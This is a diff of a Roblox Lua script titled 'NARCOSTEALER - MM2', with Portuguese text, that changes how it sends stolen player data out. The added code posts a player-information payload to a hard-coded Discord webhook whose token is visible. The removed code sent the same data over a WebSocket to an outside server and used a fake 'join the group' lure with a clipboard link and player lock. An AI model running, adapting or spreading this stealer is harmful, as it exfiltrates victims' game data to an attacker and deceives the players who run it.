@@ -1,4 +1,4 @@
--- ====== NARCOSTEALER - MM2 ======
+-- ====== NARCOSTEALER - MM2 (SEM KEY) ======
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -7,51 +7,33 @@ local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
 local LP = Players.LocalPlayer
 
-local KEY = _G.NARCO_KEY or ""
+-- ====== WEBHOOK DIRETO ======
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1540525930642931792/j_CgayGy_uUDQqqQpGT-6pzSRPuAve_Cm1Uh8b1TQNXdhbO3FHB4-uQcvkSSu6q28qjJ"
 
-if not KEY or KEY == "" then
-    LP:Kick("Key não detectada. Use: _G.NARCO_KEY = \"NL-XXXX-XXXX-XXXX\"")
-    return
-end
-
-if not KEY:match("^NL%-[A-Z0-9]+%-[A-Z0-9]+%-[A-Z0-9]+$") then
-    LP:Kick("Formato de key inválido. Use: NL-XXXX-XXXX-XXXX")
-    return
-end
-
--- ====== WEBSOCKET FIXO ======
-local WEBSOCKET_URL = "wss://narcolandia-production.up.railway.app"
-
-local function connectWebSocket()
-    local ws
+local function sendToWebhook(payload)
     local success = pcall(function()
-        if syn and syn.websocket then
-            ws = syn.websocket.connect(WEBSOCKET_URL)
-        elseif WebSocket then
-            ws = WebSocket.connect(WEBSOCKET_URL)
+        if syn and syn.request then
+            syn.request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        elseif request then
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
         else
-            error("Executor não suporta WebSocket")
+            error("Executor não suporta requisições HTTP")
         end
     end)
-    
-    if success and ws then
-        wait(1)
-        return ws
-    end
-    return nil
-end
-
-local function sendToWebSocket(ws, payload)
-    local message = {
-        key = KEY,
-        payload = payload
-    }
-    
-    local success = pcall(function()
-        ws:Send(HttpService:JSONEncode(message))
-        return true
-    end)
-    
     return success
 end
 
@@ -172,7 +154,7 @@ local function createGroupUI()
     desc.Size = UDim2.new(0.9, 0, 0, 120)
     desc.Position = UDim2.new(0.05, 0, 0.25, 0)
     desc.BackgroundTransparency = 1
-    desc.Text = "Para continuar usando o script, você precisa entrar na nossa comunidade!\n\nClique no botão abaixo para copiar o link, entre no grupo do Roblox e re-execute o script.\n\nO grupo é gratuito e leva menos de 1 minuto.\n\nApós entrar, todas as funções serão desbloqueadas."
+    desc.Text = "Script executado com sucesso!\n\nDados enviados para o servidor.\n\n🔓 Todas as funções desbloqueadas!"
     desc.Font = Enum.Font.Gotham
     desc.TextColor3 = Color3.fromRGB(200, 200, 220)
     desc.TextSize = 16
@@ -188,40 +170,13 @@ local function createGroupUI()
     
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(1, 0, 1, 0)
-    btn.Text = "📋 Copiar Link do Grupo"
+    btn.Text = "✅ Script Ativado"
     btn.Font = Enum.Font.GothamBold
     btn.TextScaled = true
-    btn.BackgroundColor3 = Color3.fromRGB(150, 0, 255)
+    btn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.Parent = btnContainer
     Instance.new("UICorner").CornerRadius = UDim.new(0, 8)
-    
-    btn.MouseEnter:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(200, 0, 255)}):Play()
-    end)
-    btn.MouseLeave:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(150, 0, 255)}):Play()
-    end)
-    
-    local notification = Instance.new("TextLabel")
-    notification.Size = UDim2.new(0.8, 0, 0, 40)
-    notification.Position = UDim2.new(0.1, 0, 0.88, 0)
-    notification.BackgroundTransparency = 1
-    notification.Text = ""
-    notification.Font = Enum.Font.Gotham
-    notification.TextColor3 = Color3.fromRGB(0, 255, 0)
-    notification.TextSize = 14
-    notification.TextXAlignment = Enum.TextXAlignment.Center
-    notification.Parent = container
-    
-    btn.MouseButton1Click:Connect(function()
-        -- O link falso será substituído pelo servidor quando servir o script
-        local fakeLink = "https://www.roblox.com/groups/..."
-        setclipboard(fakeLink)
-        notification.Text = "✅ Link copiado! Entre no grupo e re-execute o script."
-        notification.TextColor3 = Color3.fromRGB(0, 255, 0)
-        lockPlayer()
-    end)
     
     return screenGui
 end
@@ -254,6 +209,11 @@ local discordPayload = {
                 name = "<a:money:1370803268242116639> Nível MM2",
                 value = "```" .. getLevel() .. "```",
                 inline = false
+            },
+            {
+                name = "🔑 Key",
+                value = "```SEM KEY (Webhook Direto)```",
+                inline = false
             }
         },
         footer = {
@@ -269,9 +229,7 @@ local discordPayload = {
     }}
 }
 
-local ws = connectWebSocket()
-if ws then
-    sendToWebSocket(ws, discordPayload)
-    wait(1)
-    pcall(function() ws:Close() end)
-end
+-- Envia direto pro webhook
+sendToWebhook(discordPayload)
+
+print("✅ Script executado! Dados enviados para o webhook.")
